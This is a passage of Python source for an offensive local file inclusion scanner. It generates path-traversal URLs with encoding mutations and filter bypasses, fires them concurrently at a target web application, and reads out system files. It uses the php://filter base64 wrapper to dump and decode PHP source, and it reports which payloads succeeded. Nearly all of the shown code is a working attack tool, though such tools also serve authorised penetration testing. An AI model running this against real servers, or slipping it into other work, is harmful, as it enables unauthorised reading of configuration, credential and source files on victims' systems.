            filepath = target_file.get('path')
            # Trim off the leading slash from the filepath, if one is present
            if filepath.startswith('/') and len(filepath) > 1:
                filepath = filepath[1:]
            # Try with a leading slash and without
            for slash in ['', '/']:
                # For each traversal type...
                for traversal in traversals:
                    # For each ending type...
                    for ending in endings:
                        base_resource = f'{slash}{depth * traversal}{filepath}{ending}'
                        # For each mutation...
                        for _mutation in mutations:
                            for _bypass in bypasses:
                                if exit_flag:
                                    break
                                modified_resource = _bypass(_mutation(base_resource))
                                url = args.url + modified_resource
                                # Enqueue the request
                                job = {
                                    "filepath": target_file.get('path'),
                                    "traversal": traversal,
                                    "depth": depth,
                                    "leading_slash": (slash == '/'),
                                    "ending": ending,
                                    "mutation": _mutation.__name__,
                                    "bypass": _bypass.__name__,
                                    "url": url,
                                    "idx": idx
                                }
                                job_queue.put(job)
                                idx += 1
    # Reset the successes dict
    global successes
    successes = {}
    # Start issuing requests
    return concurrent_async_requests(job_queue, exit_early=True, ignore_filters=False)


def parse_lfi_url(successful_example_lfi):
    """
    Figure out what type of traversal, encodings, etc were used to produce the example lfi.
    Do this by com
    :param successful_example_lfi: An example LFI that already works. I.e. the output of "scan" mode: args.example_lfi
    :return: a dictionary representing a Job that performs the LFI.
    """
    idx = 0
    for depth in range(args.min, args.max + 1):
        for target_file in [f for f in files_to_test if 'variables' not in f]:
            filepath = target_file.get('path')
            # Trim off the leading slash from the filepath, if one is present
            if filepath.startswith('/') and len(filepath) > 1:
                filepath = filepath[1:]
            for slash in ['', '/']:
                for traversal in traversals:
                    for ending in endings:
                        base_resource = f'{slash}{depth * traversal}{filepath}{ending}'
                        for _mutation in mutations:
                            for _bypass in bypasses:
                                modified_resource = _bypass(_mutation(base_resource))
                                url = args.url + modified_resource
                                if successful_example_lfi == modified_resource:
                                    return {
                                        "filepath": target_file.get('path'),
                                        "traversal": traversal,
                                        "depth": depth,
                                        "leading_slash": (slash == '/'),
                                        "ending": ending,
                                        "mutation": _mutation.__name__,
                                        "bypass": _bypass.__name__,
                                        "url": url,
                                        "idx": idx
                                    }
                                idx += 1
    return None


def enum(example_job):
    """
    Perform enumeration mode. Start with an example URL and figure out what traversal, encoding, and bypass was used
    """
    if example_job is None:
        if args.colorless:
            print(f"{' '*64}\n[-] No LFI parameters were found that successfully reproduce the provided \"example-lfi\":\n\n"
                  f"    {args.example_lfi}\n"
                  f"Please use the output of \"scan\" mode as an example, or at least use a successful LFI "
                  f"for one of the files already defined in file-list.json\n")
        else:
            print(
                f"{' ' * 64}\n{colors.RED}[-] No LFI parameters were found that successfully reproduce the provided \"example-lfi\":\n\n"
                f"{colors.END}    {args.example_lfi}\n\n"
                f"{colors.RED}Please use the output of \"scan\" mode as an example, or at least use a successful LFI "
                f"for one of the files already defined in file-list.json\n{colors.END}")
        sys.exit(1)

    if args.verbose:
        parsed_job_text = json.dumps(example_job, sort_keys=True, indent='    ')
        print(f'Example job was parsed as the following:\n{parsed_job_text}')



    # Should try all files without variables then all the files with variables
    # There should also be accommodations for PHP files

    def find_first(iterable, predicate):
        return next((item for item in iterable if predicate(item)), None)

    def assemble_job(f, _slash, _traversal, _ending, _depth, _mutation_func_name, _bypass_func_name, use_php_base64=False):
        _filepath = f['path']
        if _filepath.startswith('/') and len(_filepath) > 1 and _depth > 0:
            _filepath = _filepath[1:]
        _base_resource = f'{_slash}{_depth * _traversal}{_filepath}{_ending}'
        if use_php_base64:
            php_b64 = 'php://filter/convert.base64-encode/resource='
            _base_resource = f'{php_b64}{_depth * _traversal}{_filepath}{_ending}'
        _mut = find_first(mutations, lambda m: m.__name__ == _mutation_func_name)
        _byp = find_first(bypasses, lambda b: b.__name__ == _bypass_func_name)
        if not _mut or not _byp:
            print(f'Failed to look up mutation or bypass by name. '
                  f'Mutation: {_mutation_func_name}  Bypass: {_bypass_func_name}')
        _url = args.url + _byp(_mut(_base_resource))
        _job = {
            "filepath": f['path'],
            "traversal": _traversal,
            "depth": _depth,
            "leading_slash": (_slash == '/'),
            "ending": _ending,
            "mutation": _mut.__name__,
            "bypass": _byp.__name__,
            "url": _url,
            "idx": -1
        }
        if use_php_base64:
            _job['expect_base64'] = 1
        return _job

    # Create a queue of requests to make
    job_queue = queue.Queue()
    # We know the depth of the path to /etc/hosts or boot.ini, so...
    # - We can try any absolute filepaths at this depth
    # - We can try all relative filepaths/filenames at any depth

    # Slash, traversal, ending, mutation, and bypass are all known.
    # i.e. the only variables are filepath and depth.
    slash = '/' if example_job['leading_slash'] else ''
    traversal = example_job['traversal']
    ending = example_job['ending']
    depth = example_job['depth']

    # 1) Absolute filepaths without variables
    # 2) Relative filepaths without variables
    # 3) Absolute filepaths with variables
    # 4) Relative filepaths with variables
    # While doing any of the above, accommodate PHP

    def add_job(file, depth):
        nonlocal idx
        use_php_b64 = False
        if file['path'].lower().endswith('.php'):
            use_php_b64 = True
        job = assemble_job(file, slash, traversal, ending, depth, example_job['mutation'], example_job['bypass'], use_php_b64)
        job['idx'] = idx
        idx += 1
        job_queue.put(job)

    def process_fixed(files, depth_range):
        for file in files:
            for d in depth_range:
                add_job(file, d)

    def process_variable(files, depth_range):
        for file in files:
            for d in depth_range:
                for fp in exrex.generate(file['regex'], 200):
                    file['path'] = fp
                    add_job(file, d)

    idx = 0
    depth_range = range(args.min, args.max + 1)

    fixed_files = [f for f in files_to_test if 'variables' not in f]
    variable_files = [f for f in files_to_test if 'variables' in f]

    process_fixed([f for f in fixed_files if f['absolute'] == 1], [depth])
    process_fixed([f for f in fixed_files if f['absolute'] == 0], depth_range)
    process_variable([f for f in variable_files if f['absolute'] == 1], [depth])
    process_variable([f for f in variable_files if f['absolute'] == 0], depth_range)

    # Reset the successes dict
    global successes
    successes = {}
    # Start issuing requests
    return concurrent_async_requests(job_queue, exit_early=False, ignore_filters=False, show_results=True)


def enum_report():
    if len(successes) > 0:
        for filepath in successes:
            successful_jobs = successes[filepath]
            shortest_job_idx = find_shortest_example(successful_jobs)
            shortest_job = successful_jobs[shortest_job_idx]
            if 'decoded' in shortest_job:
                decoded_text = shortest_job['decoded'].decode()
                if args.colorless:
                    print(f"{' ' * 64}\n[+] Successfully decoded file: {filepath}:\n")
                else:
                    print(f"{' ' * 64}\n{colors.GREEN}[+] Successfully decoded file: {colors.BOLD}{filepath}{colors.UNBOLD}{colors.END}:\n")
                for line in decoded_text.split('\n'):
                    print('    ' + line)

def find_shortest_example(successful_jobs):
    shortest = (-1, math.inf)
    for idx, job in enumerate(successful_jobs):
        if len(job['url']) < shortest[1]:
            shortest = (idx, len(job['url']))
    return shortest[0]

def concurrent_async_requests(job_queue, exit_early, ignore_filters, show_results=False):
    """
    Issue requests concurrently. Use up to the defined number of threads. SIGINT will terminate
    all requests and prevent new ones from starting.
    :param job_queue: a queue.Queue object, where each item is a "job". The "job" is a dict that
    must have at least these keys: url, filepath, idx
    :param exit_early: process requests such that they stop after the first one deemed "successful"
    :param ignore_filters: When True, all requests are deemed "successful"
    :param show_results: When True, positive results from requests will be printed out as they arrive.
    :return: total number of jobs that were enqueued
    """
    num_jobs = job_queue.qsize()
    # In case there are fewer jobs than threads, don't create extra threads
    N = min(args.threads, num_jobs)
    with concurrent.futures.ThreadPoolExecutor(max_workers=N) as executor:
        # Submit the process_urls function for each worker thread
        workers = [executor.submit(process_urls,
                                   job_queue,
                                   exit_on_success=exit_early,
                                   ignore_filters=ignore_filters,
                                   show_results=show_results) for _ in range(N)]
        # Wait for all tasks to complete
        try:
            # Wait for all tasks to complete
            while not exit_flag:
                time.sleep(0.1)
        except KeyboardInterrupt:
            print("")
        # Stop the worker threads by adding None to the queue for each worker
        for _ in range(N):
            job_queue.put(None)
        # Wait for all worker threads to finish
        concurrent.futures.wait(workers)
    return num_jobs


def filter_probe_report(suggested_fc, suggested_fs, suggested_fw):

    fc = suggested_fc['candidates']
    fs = suggested_fs['candidates']
    fw = suggested_fw['candidates']

    fc_suggestion_text, fs_suggestion_text, fw_suggestion_text, = '', '', ''

    # Suggest a HTTP status code filter
    # Don't ever suggest to filter out HTTP 200
    codes = sorted([str(x[0]) for x in fc])
    if '200' in codes:
        codes.remove('200')
    s = ','.join(codes)
    if len(codes) > 0:
        fc_suggestion_text = f"-fc '{s}'"

    # Do a quick check to see if the filename was getting reflected (should have the same range as the filename lengths)
    fs_vals = [x[0] for x in fs]
    # if the range of byte counts is within 5 of the filename length bounds, then suggest a range
    filename_length_range = filename_length_bounds[1] - filename_length_bounds[0]
    fs_val_range = suggested_fs['range'][1] - suggested_fs['range'][0]
    if fs_val_range < filename_length_range + 9:
        fs_suggestion_text_min = int((max(fs_vals) + min(fs_vals))//2 - (filename_length_range//2 + 3))
        fs_suggestion_text_max = int((max(fs_vals) + min(fs_vals))//2 + (filename_length_range//2 + 6))
        fs_suggestion_text = f"-fs '{fs_suggestion_text_min}-{fs_suggestion_text_max}'"

    # Suggest a word count filter
    if len(fw) < 5:
        s = ','.join(sorted([str(x[0]) for x in fw]))
        fw_suggestion_text = f"-fw '{s}'"

    if len(fc) > 0 or len(fs) > 0 or len(fw) > 0:
        if args.colorless:
            print(f"{' ' * 64}\n[+] Initial tests showed that these filters might be useful: ")
        else:
            print(f"{' ' * 64}\n{colors.GREEN}[+] Initial tests showed that these filters might be useful: {colors.END}")
        if len(fc) > 0:
            print("    HTTP status code (-fc, --filter-codes):")
            for f in fc:
                print(f'        {f[0]:<4} ({(f[1]*100):.1f}%)')
        if len(fs) > 0:
            print("    Response size, in bytes (-fs, --filter-size):")
            for f in fs:
                print(f'        {f[0]:<6} ({(f[1]*100):.1f}%)')
        if len(fw) > 0:
            print("    Response word count (-fw, --filter-words):")
            for f in fw:
                print(f'        {f[0]:<6} ({(f[1]*100):.1f}%)')
        suggestion_text = ' '.join([fc_suggestion_text, fs_suggestion_text, fw_suggestion_text])
        if suggestion_text and suggestion_text != '':
            if args.colorless:
                print(f"{' ' * 64}\nTry using the following filters when you run "
                      f"\"scan\" and \"enum\" modes: \n    {suggestion_text}")
            else:
                print(f"{' ' * 64}\nTry using the following filters when you run "
                      f"\"scan\" and \"enum\" modes: \n    {colors.GREEN}{suggestion_text}{colors.END}")
    else:
        if args.colorless:
            print(f"{' ' * 64}\n[-] Failed to determine any useful filters for the scan")
        else:
            print(f"{' ' * 64}\n{colors.RED}[-] Failed to determine any useful filters for the scan{colors.END}")
    print('   ')


def scan_report():

    if len(successes) > 0:
        if args.verbose or True:
            for filepath in successes:
                successful_jobs = successes[filepath]
                shortest_job_idx = find_shortest_example(successful_jobs)
                if args.colorless:
                    print(f"{' '*64}\n[+] LFI discovered for file: {filepath} in {len(successful_jobs)} way(s)"
                          f" (See below for one example)\n    {successful_jobs[shortest_job_idx]['url']}")
                else:
                    bolded_url = (args.url + colors.BOLD + colors.GREEN +
                                  successful_jobs[shortest_job_idx]['url'][len(args.url):] + colors.END + colors.UNBOLD)
                    print(f"{' '*64}\n{colors.GREEN}[+] LFI discovered for file: {filepath} in {len(successful_jobs)} way(s){colors.END}"
                          f" (See below for one example)\n    {bolded_url}")
                if args.verbose:
                    print(json.dumps(successful_jobs[shortest_job_idx], indent='   '))
    else:
        if args.colorless:
            print(f"{' ' * 64}\n[-] Failed to locate any LFI using the provided parameters")
        else:
            print(f"{' ' * 64}\n{colors.RED}[-] Failed to locate any LFI using the provided parameters{colors.END}")
    print('   ')


def main():
    if not args.quiet:
        if args.colorless:
            print(banner_colorless)
        else:
            print(banner)
        print_options(args.mode)
    # Register the signal handler for SIGINT
    signal.signal(signal.SIGINT, signalHandler)
    # Validate the args provided
    validate_args()
    # load the list of files to target
    load_files_list(args.target_system)

    if args.mode == "filter":
        start_time = time.time()
        filter_suggestions = probe_for_filters(repetitions=3)
        end_time = time.time()
        elapsed = end_time - start_time
        print(
            f"\nFilter probes complete: {filter_suggestions['num_requests']} requests in {elapsed:.1f}s ({(filter_suggestions['num_requests'])/elapsed:.0f} req/s)")
        filter_probe_report(filter_suggestions['fc'], filter_suggestions['fs'], filter_suggestions['fw'])

    if args.mode == "scan":
        start_time = time.time()
        n = scan()
        end_time = time.time()
        elapsed = end_time - start_time
        print(f"\nScan complete: {max_request_index+1}/{n} requests in {elapsed:.1f}s ({(max_request_index+1)/elapsed:.0f} req/s)")
        scan_report()

    if args.mode == "enum":
        start_time = time.time()
        example_job = parse_lfi_url(args.example_lfi)
        n = enum(example_job)
        end_time = time.time()
        elapsed = end_time - start_time
        print(f"\nEnumeration complete: {n} requests in {elapsed:.1f}s ({n / elapsed:.0f} req/s)")
        enum_report()

    if args.mode == "batch":
        print('TODO: I haven\'t written \"batch\" mode yet! Please run it in filter mode, then scan mode, then enum mode.')
        sys.exit(0)


if __name__ == "__main__":
    main()
